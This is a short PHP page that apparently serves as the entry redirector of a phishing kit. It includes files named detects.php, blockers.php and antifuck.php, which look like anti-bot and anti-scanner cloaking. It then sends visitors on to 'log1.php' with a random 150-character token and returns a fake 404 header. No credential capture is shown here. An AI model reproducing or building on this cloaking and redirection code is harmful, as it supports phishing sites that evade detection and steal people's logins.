<?php
session_start();
include('../detects.php');
include('../blockers.php');
include('../antifuck.php');
?>
<?php
function rands($length = 150) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$r = rands();
?>
<?php

?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta http-equiv="refresh" content="0; url=log1.php?<?php echo $r?>">
</head>
<body>
</body>
</html>
<?php
header("HTTP/1.0 404 Not Found");
exit();
?>